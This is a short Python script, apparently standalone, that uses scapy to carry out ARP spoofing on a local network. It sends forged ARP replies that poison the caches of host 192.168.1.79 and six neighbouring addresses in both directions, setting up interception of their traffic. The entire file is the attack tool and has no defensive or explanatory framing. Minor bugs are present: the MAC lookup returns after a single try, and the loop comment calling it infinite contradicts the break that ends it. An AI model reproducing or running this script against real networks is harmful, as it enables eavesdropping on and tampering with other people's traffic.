import scapy.all as scapy
import time

def get_mac(ip):
    mac = "xx"
    while mac == "xx":
        try:
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=1 , verbose=False)[0]
            mac = answered_list[0][1].hwsrc
            # print(mac)
        except:
            pass
        finally:
            return mac

def spoof(target_ip, spoof_ip):
        target_mac = get_mac(target_ip)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,   psrc=spoof_ip)
        scapy.send(packet)



spoof_ips = ["192.168.1.1", "192.168.1.2", "192.168.1.3", "192.168.1.4", "192.168.1.5", "192.168.1.6"]

# Infinitely loop through the list of spoof IPs
while True:
    for spoof_ip in spoof_ips:
        spoof("192.168.1.79", spoof_ip)
        spoof(spoof_ip, "192.168.1.79")
    break
